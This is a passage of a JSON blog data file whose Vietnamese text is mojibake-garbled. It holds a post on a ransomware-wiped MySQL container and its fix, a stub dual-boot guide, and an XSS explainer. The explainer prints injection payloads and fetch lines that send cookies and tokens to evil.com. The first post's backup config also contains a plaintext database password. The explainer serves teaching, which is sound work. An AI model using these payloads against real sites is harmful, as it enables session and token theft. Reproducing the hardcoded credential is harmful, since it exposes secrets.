M·ªôt th√¥ng ƒëi·ªáp \"ng·ªçt ng√†o\" hi·ªán ra:\n\n<Image\n  src=\"/images/blogs/mysql-lost-data/img2.png\"\n  alt=\"Ransomware message y√™u c·∫ßu ti·ªÅn chu·ªôc\"\n  layout=\"responsive\"\n  width={1070}\n  height={280}\n/>\n\nƒê·∫°i lo·∫°i l√† m·ªôt v·ªã hacker n√†o ƒë√≥ ƒë√£ \"ti·ªán tay\" x√≥a s·∫°ch database c·ªßa t√¥i v√† ƒë·ªÉ l·∫°i l·ªùi nh·∫Øn ƒë√≤i Bitcoin ƒë·ªÉ l·∫•y l·∫°i d·ªØ li·ªáu. ƒê√∫ng l√† c√°i t√°t tr·ªùi gi√°ng!\n\nMay m·∫Øn thay, d·ªØ li·ªáu b·ªã m·∫•t ch·ªâ l√† d·ªØ li·ªáu test, kh√¥ng c√≥ g√¨ quan tr·ªçng. Nh∆∞ng c√°i kh√≥ ch·ªãu l√† c·ª© v√†i ng√†y l·∫°i m·∫•t data m·ªôt l·∫ßn l√†m m√¨nh ph√°t ƒëi√™n :))))). V√† t√¥i c≈©ng c·∫ßn ph·∫£i fix c√°i l·ªó h·ªïng n√†y th·∫≠t s·ªõm tr∆∞·ªõc khi app go live ƒë·ªÉ tr√°nh m·∫•t d·ªØ li·ªáu th·∫≠t.\n\n## Ph√¢n t√≠ch nguy√™n nh√¢n v√† c√°ch kh·∫Øc ph·ª•c\n\nSau khi ng·ªìi \"ƒë·∫≠p ƒë·∫ßu v√†o t∆∞·ªùng\" m·ªôt h·ªìi, t√¥i ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c hai nguy√™n nh√¢n ch√≠nh:\n\n1. **Expose port kh√¥ng c·∫ßn thi·∫øt**: T√¥i ƒë√£ m·ªü port 3306 c·ªßa MySQL ra internet, ƒëi·ªÅu n√†y ho√†n to√†n kh√¥ng c·∫ßn thi·∫øt v√¨ app backend c·ªßa t√¥i ƒë√£ ch·∫°y trong c√πng m·ªôt network v·ªõi database. Expose port ki·ªÉu n√†y ch·∫≥ng kh√°c n√†o m·ªü toang c·ª≠a m·ªùi k·∫ª tr·ªôm v√†o nh√†.\n\n2. **M·∫≠t kh·∫©u qu√° ƒë∆°n gi·∫£n**: `12345678`? Seriously? ƒê√∫ng ki·ªÉu m·∫≠t kh·∫©u m√† m·ªôt ƒë·ª©a tr·∫ª 5 tu·ªïi c≈©ng ƒëo√°n ƒë∆∞·ª£c. V·ªõi c√°c bot t·ª± ƒë·ªông qu√©t internet t√¨m ki·∫øm c√°c d·ªãch v·ª• MySQL ƒëang m·ªü, vi·ªác brute-force m·∫≠t kh·∫©u ƒë∆°n gi·∫£n n√†y ch·ªâ l√† chuy·ªán v√†i gi√¢y.\n\n## Gi·∫£i ph√°p kh·∫Øc ph·ª•c\n\nSau khi x√°c ƒë·ªãnh ƒë∆∞·ª£c nguy√™n nh√¢n, vi·ªác kh·∫Øc ph·ª•c tr·ªü n√™n kh√° ƒë∆°n gi·∫£n:\n\n### 1. Ch·ªânh s·ª≠a file docker-compose.yml, kh√¥ng c·∫ßn expose port ra ngo√†i n·ªØa, giao ti·∫øp gi·ªØa backend v√† database ch·ªâ c·∫ßn d√πng m·∫°ng n·ªôi b·ªô l√† ƒë·ªß\n\n```yml\nservices:\n  db:\n    image: mysql:8\n    restart: always\n    environment:\n      MYSQL_ROOT_PASSWORD: 12345678\n      MYSQL_DATABASE: intel-money\n    volumes:\n      - db_data:/var/lib/mysql\n    # Kh√¥ng expose port ra ngo√†i n·ªØa\n    # ports:\n    #  - \"3306:3306\"\n    container_name: mysql-db\n    networks:\n      - app-network\n    ...\n\nnetworks:\n  app-network:\n    driver: bridge\n\nvolumes:\n  db_data:\n\n```\n\n### 2. T·∫°o m·ªôt m·∫≠t kh·∫©u m·ªõi m·∫°nh h∆°n\n\n### 3. C√†i ƒë·∫∑t v√† c·∫•u h√¨nh backup t·ª± ƒë·ªông\nƒê·ªÉ ph√≤ng ng·ª´a tr∆∞·ªùng h·ª£p x·∫•u nh·∫•t, t√¥i ƒë√£ thi·∫øt l·∫≠p backup t·ª± ƒë·ªông m·ªói ng√†y b·∫±ng c√°ch th√™m images sau v√†o docker compose:\n\n```yml\nmysql-backup:\n    image: fradelg/mysql-cron-backup\n    restart: always\n    environment:\n      MYSQL_HOST: db\n      MYSQL_PORT: 3306\n      MYSQL_USER: root\n      MYSQL_PASS: M2V4ICj0j7IQ\n      MYSQL_DB: intel-money\n      CRON_TIME: \"0 2 * * *\"  # backup l√∫c 2h s√°ng m·ªói ng√†y\n      MAX_BACKUPS: \"7\"\n      TZ: \"Asia/Ho_Chi_Minh\"\n    volumes:\n      - ./data/db-backups:/backup\n    depends_on:\n      - db\n```\n\nSau khi √°p d·ª•ng c√°c bi·ªán ph√°p tr√™n, server MySQL c·ªßa t√¥i ƒë√£ kh√¥ng c√≤n b·ªã t·∫•n c√¥ng n·ªØa. T√¥i c√≥ th·ªÉ ng·ªß ngon m√† kh√¥ng lo l·∫Øng s√°ng mai t·ªânh d·∫≠y s·∫Ω l·∫°i th·∫•y th√¥ng b√°o \"RECOVER_YOUR_DATA\" :))))))\n\nB√†i h·ªçc r√∫t ra t·ª´ c√¢u chuy·ªán ƒëau l√≤ng n√†y:\n\n- Kh√¥ng bao gi·ªù expose port database ra internet n·∫øu kh√¥ng th·ª±c s·ª± c·∫ßn thi·∫øt\n- Lu√¥n s·ª≠ d·ª•ng m·∫≠t kh·∫©u m·∫°nh (v√† kh√°c nhau cho m·ªói d·ªãch v·ª•)",
    "title": "Container MySQL server c·ªßa t√¥i ƒë√£ b·ªã t·∫•n c√¥ng, to√†n b·ªô d·ªØ li·ªáu b·ªã m·∫•t s·∫°ch",
    "publishedAt": "2025-05-14",
    "image": "/images/blogs/mysql-lost-data/img0.png",
    "summary": "C√¢u chuy·ªán ƒëau l√≤ng v·ªÅ vi·ªác server MySQL c·ªßa t√¥i b·ªã t·∫•n c√¥ng ransomware v√† nh·ªØng b√†i h·ªçc ƒë·∫Øt gi√° t·ª´ s·ª± c·ªë n√†y.",
    "tags": [
      "Security"
    ],
    "readTime": "7 min read",
    "author": "Larry Vu"
  },
  {
    "slug": "duo-boot-win-vs-ubuntu",
    "content": "\n## Why Dual Boot?\n\nDual booting gives you the best of both worlds - you can keep your familiar Windows system while exploring the powerful features of Ubuntu Linux. It's perfect for:\n- Learning Linux without commitment\n- Development work that requires Linux\n- Running software specific to each OS\n- Maintaining Windows for gaming while using Linux for work\n\n## Prerequisites\n\nBefore we begin, make sure you have:\n- Windows 10/11 already installed\n- At least 30GB of free disk space\n- A USB drive (8GB or larger)\n- Backup of important data\n- Basic knowledge of BIOS/UEFI settings\n\n## Step-by-Step Guide\n\n### 1. Create Ubuntu Installation Media\nFirst, we'll need to create a bootable USB drive:\n1. Download Ubuntu from ubuntu.com\n2. Download Rufus USB creator\n3. Create bootable USB using Rufus\n\n### 2. Prepare Your Windows System\n- Backup important data\n- Create free disk space by shrinking Windows partition\n- Disable Fast Startup in Windows\n- Disable Secure Boot in BIOS\n\n[Continue with remaining sections...]",
    "title": "How to Dual Boot Windows & Ubuntu Easily!",
    "publishedAt": "2025-03-30",
    "image": "/images/blogs/duo-boot-win-vs-ubuntu/thumbnails.png",
    "summary": "Want to try Linux without removing your existing Windows system? This 10-minute guide will show you how!",
    "tags": [
      "Tutorial"
    ],
    "readTime": "15 min read",
    "author": "Larry Vu"
  },
  {
    "slug": "about-xss",
    "content": "\n## XSS l√† g√¨?\n\nCross-Site Scripting (XSS) l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t ph·ªï bi·∫øn trong c√°c ·ª©ng d·ª•ng web, cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (th∆∞·ªùng l√† JavaScript) v√†o trang web m√† ng∆∞·ªùi d√πng kh√°c truy c·∫≠p. ƒêi·ªÅu n√†y c√≥ th·ªÉ d·∫´n ƒë·∫øn vi·ªác ƒë√°nh c·∫Øp th√¥ng tin nh·∫°y c·∫£m, chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn phi√™n l√†m vi·ªác, ho·∫∑c th·ª±c hi·ªán c√°c h√†nh ƒë·ªông thay m·∫∑t n·∫°n nh√¢n.\n\nM·ªôt v√≠ d·ª• ƒë∆°n gi·∫£n v√† d·ªÖ hi·ªÉu: \n\nGi·∫£ s·ª≠ b·∫°n c√≥ m·ªôt trang web cho ph√©p ng∆∞·ªùi d√πng thay ·∫£nh ƒë·∫°i di·ªán c·ªßa m√¨nh b·∫±ng c√°ch nh·∫≠p URL c·ªßa ·∫£nh ƒë·ªÉ b·∫°n kh√¥ng c·∫ßn l∆∞u tr·ªØ v√† x·ª≠ l√Ω ·∫£nh tr√™n server (ho·∫∑c m·ªôt tr∆∞·ªùng h·ª£p kh√°c t∆∞∆°ng t·ª±).\nNg∆∞·ªùi d√πng c√≥ th·ªÉ nh·∫≠p URL c·ªßa ·∫£nh t·ª´ m·ªôt trang web kh√°c, v√† b·∫°n s·∫Ω render n√≥ nh∆∞ sau:\n\n```html\n<img src=\"{userInput}\" />\n```\n\n\nK·∫ª t·∫•n c√¥ng v√¥ t√¨nh bi·∫øt ƒë∆∞·ª£c ƒëi·ªÅu n√†y v√† ƒë√£ l·ª´a ng∆∞·ªùi d√πng thay avatar c·ªßa m√¨nh b·∫±ng m·ªôt URL ƒë·ªôc h·∫°i nh∆∞ sau:\n\n```html\nhttps://example.com/evil.png\" onerror=\"alert('XSS!')\n\n```\n\n`https://example.com/evil.png` l√† m·ªôt ·∫£nh kh√¥ng t·ªìn t·∫°i, v√¨ v·∫≠y tr√¨nh duy·ªát s·∫Ω kh√¥ng th·ªÉ t·∫£i ƒë∆∞·ª£c ·∫£nh n√†y v√† s·∫Ω g·ªçi h√†m `onerror` ƒë·ªÉ x·ª≠ l√Ω l·ªói. Trong tr∆∞·ªùng h·ª£p n√†y, h√†m `onerror` s·∫Ω th·ª±c thi m√£ JavaScript m√† k·∫ª t·∫•n c√¥ng ƒë√£ ch√®n v√†o, d·∫´n ƒë·∫øn vi·ªác hi·ªÉn th·ªã th√¥ng b√°o \"XSS!\".\n\nThay v√¨ hi·ªÉn th·ªã th√¥ng b√°o, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ th·ª±c hi·ªán c√°c h√†nh ƒë·ªông kh√°c nh∆∞ g·ª≠i cookie c·ªßa ng∆∞·ªùi d√πng ƒë·∫øn m√°y ch·ªß c·ªßa m√¨nh ho·∫∑c th·ª±c hi·ªán c√°c h√†nh ƒë·ªông kh√°c tr√™n trang web m√† ng∆∞·ªùi d√πng ƒëang truy c·∫≠p.\n\nB·∫°n n√†o m√† c√≤n l∆∞u API key, token hay cookie trong localStorage ho·∫∑c sessionStorage th√¨ kh√¥ng kh√°c g√¨ d√¢ng token cho k·∫ª t·∫•n c√¥ng ƒë√¢u nh√©. V√≠ d·ª• thay v√¨ `alert('XSS!')`, n·∫øu l√†:\n\n```html\nfetch('https://evil.com/steal-cookie?cookie=' + document.cookie)\n```\n\nhay: \n\n\n```html\nfetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))\n```\n\nth√¨ k·∫ª t·∫•n c√¥ng ƒë√£ c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c cookie hay token c·ªßa ng∆∞·ªùi d√πng r·ªìi.\n\n---\n\n## C√°c lo·∫°i XSS ph·ªï bi·∫øn\n\n1. **Stored XSS (XSS l∆∞u tr·ªØ)**  \n   M√£ ƒë·ªôc ƒë∆∞·ª£c l∆∞u tr·ªØ vƒ©nh vi·ªÖn tr√™n m√°y ch·ªß (v√≠ d·ª•: trong c∆° s·ªü d·ªØ li·ªáu) v√† ƒë∆∞·ª£c th·ª±c thi khi ng∆∞·ªùi d√πng truy c·∫≠p trang b·ªã ·∫£nh h∆∞·ªüng.\n\n2. **Reflected XSS (XSS ph·∫£n chi·∫øu)**  \n   M√£ ƒë·ªôc ƒë∆∞·ª£c ph·∫£n chi·∫øu t·ª´ m√°y ch·ªß, th∆∞·ªùng th√¥ng qua URL ho·∫∑c input form, v√† ƒë∆∞·ª£c th·ª±c thi trong tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n.\n\n3. **DOM-based XSS**  \n   L·ªó h·ªïng t·ªìn t·∫°i trong m√£ ph√≠a client, n∆°i tr√¨nh duy·ªát th·ª±c thi m√£ ƒë·ªôc do vi·ªác thao t√°c kh√¥ng an to√†n v·ªõi DOM.\n\n---\n\n## XSS c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c hi·ªán qua nh·ªØng c√°ch n√†o?\n\n### V√≠ d·ª• k·ªãch b·∫£n t·∫•n c√¥ng XSS th√¥ng qua src c·ªßa th·∫ª img\n\n·ª®ng d·ª•ng web c·ªßa b·∫°n cho ph√©p ng∆∞·ªùi d√πng nh·∫≠p URL ·∫£nh ƒë·ªÉ hi·ªÉn th·ªã (v√≠ d·ª•: ·∫£nh ƒë·∫°i di·ªán, ·∫£nh s·∫£n ph·∫©m), v√† b·∫°n render n√≥ nh∆∞ sau:\n\n```html\n<img src=\"{userInput}\" />\n\n```\n\nN·∫øu kh√¥ng validate kƒ© userInput, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i:\n```html\n\"><script>alert('XSS')</script>\n\n```\n\nKhi ƒë√≥, th·∫ª `<img>` s·∫Ω kh√¥ng ƒë∆∞·ª£c render th√†nh:\n```html\n<img src=\"\"><script>alert('XSS')</script> />\n\n```\nV√† m√£ JavaScript s·∫Ω ƒë∆∞·ª£c th·ª±c thi, d·∫´n ƒë·∫øn vi·ªác hi·ªÉn th·ªã th√¥ng b√°o \"XSS\".",
    "title": "M·ªôt v√†i ƒëi·ªÅu c·∫ßn bi·∫øt v·ªÅ XSS!!",
    "publishedAt": "2025-03-30",
    "image": "/images/blogs/about-xss/thumbnails.png",
    "summary": "Trong b√†i blog n√†y, m√¨nh s·∫Ω gi·∫£i th√≠ch ng·∫Øn g·ªçn c√°c kh√°i ni·ªám li√™n quan v√† k·∫øt h·ª£p v·ªõi demo ƒë·ªÉ c√°c b·∫°n d·ªÖ h√¨nh dung.",
    "tags": [
      "Security"
    ],
    "readTime": "8 min read",
    "author": "Larry Vu"
  }
]